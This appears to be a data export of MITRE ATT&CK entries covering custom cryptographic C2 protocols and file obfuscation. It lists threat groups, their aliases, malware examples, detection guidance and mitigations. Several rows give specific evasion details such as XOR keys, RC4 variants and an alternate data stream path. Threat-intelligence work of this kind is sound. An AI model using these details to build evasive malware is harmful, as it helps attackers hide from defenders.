455,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0074|Sakula]] encodes C2 traffic with single-byte XOR keys.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Sakula, Sakurel, VIPER",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
456,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0021|Derusbi]] obfuscates C2 traffic with variable 4-byte XOR keys.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
457,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0128|BADNEWS]] encrypts C2 data with a ROR by 3 and an XOR by 0x23.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: BADNEWS,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
458,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0009|Hikit]] performs XOR encryption.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Hikit,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
459,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0021|Derusbi]] obfuscates C2 traffic with variable 4-byte XOR keys.[[CiteRef::Fidelis Turbo]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Derusbi,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
460,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0137|CORESHELL]] C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.[[CiteRef::FireEye APT28]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CORESHELL, SOURFACE",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
461,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0148|RTM]] encrypts C2 traffic with a custom RC4 variant.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RTM,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
462,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","[u'The original variant of [[Software/S0076|FakeM]] encrypts C2 traffic using a custom encryption cipher that uses an XOR key of \u201cYHCRA\u201d and bit rotation between each XOR operation. [[Software/S0076|FakeM]] has also included HTML code in C2 traffic in an apparent attempt to evade detection. Additionally, some variants of [[Software/S0076|FakeM]] use modified SSL code for communications back to C2 servers, making SSL decryption ineffective.[[CiteRef::Scarlet Mimic Jan 2016]]']",['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: FakeM,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
463,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['The C2 server response to a beacon sent by a variant of [[Software/S0082|Emissary]] contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of [[Software/S0082|Emissary]] use various XOR operations to encrypt C2 data.[[CiteRef::Lotus Blossom Dec 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Emissary,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
464,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0060|Sys10]] uses an XOR 0x1 loop to encrypt its C2 domain.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Sys10,['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
465,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","[""Before being appended to image files, [[Software/S0037|HAMMERTOSS]] commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.[[CiteRef::FireEye APT29]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
466,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0050|CosmicDuke]] contains a custom version of the RC4 algorithm that includes a programming error.[[CiteRef::F-Secure Cosmicduke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CosmicDuke, TinyBaron, ...",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
467,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['Several [[Group/G0032|Lazarus Group]] malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation.[[CiteRef::Novetta Blockbuster Destructive Malware]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
468,"['If malware uses custom encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect when communications do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0144|ChChes]] can encrypt C2 data with a custom technique using MD5, base64-encoding, and RC4.[[CiteRef::Palo Alto menuPass Feb 2017]][[CiteRef::JPCERT ChChes Feb 2017]]']",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Since the custom protocol used may not adhere to typical protocol standards, there may be opportunities to signature the traffic on a network level for detection. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ChChes, Scorpion, HAYMAKER",['Command and Control'],['Technique/T1024'],['Custom Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1024
469,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",[u'Droppers used by [[Group/G0024|Putter Panda]] use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 \u2013 0xAF to obfuscate payloads.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
470,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['[[Group/G0043|Group5]] disguised its malicious binaries with several layers of obfuscation, including encrypting the files.[[CiteRef::Citizen Lab Group5]]']",['Group5'],['Group5'],['G0043'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],[],['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
471,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0074|Sakula]] uses single-byte XOR obfuscation to obfuscate many of its files.[[CiteRef::Dell Sakula]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: Sakula, Sakurel, VIPER",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
472,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']",['[[Software/S0142|StreamEx]] obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],Software: StreamEx,['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
473,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","['If the victim is using PowerShell 3.0 or later, [[Software/S0145|POWERSOURCE]] writes its decoded payload to an Alternate Data Stream (ADS) named kernel32.dll that is saved in <code>%PROGRAMDATA%\\Windows\\</code>.[[CiteRef::Cisco DNSMessenger March 2017]]']",['FIN7'],['FIN7'],['G0046'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: POWERSOURCE, DNSMessenger",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
474,"['Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).']","['Host forensic analysis', 'Signature-based detection', 'Host intrusion prevention systems']",[],[],"['Network protocol analysis', 'Process use of network', 'Binary file metadata', 'File monitoring', 'Malware reverse engineering']","[""[[Software/S0070|HTTPBrowser]]'s code may be obfuscated through structured exception handling and return-oriented programming.[[CiteRef::Dell TG-3390]]""]",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],[],"Software: HTTPBrowser, Token Control, HttpDump",['Defense Evasion'],['Technique/T1027'],['Obfuscated Files or Information'],https://attack.mitre.org/wiki/Technique/T1027
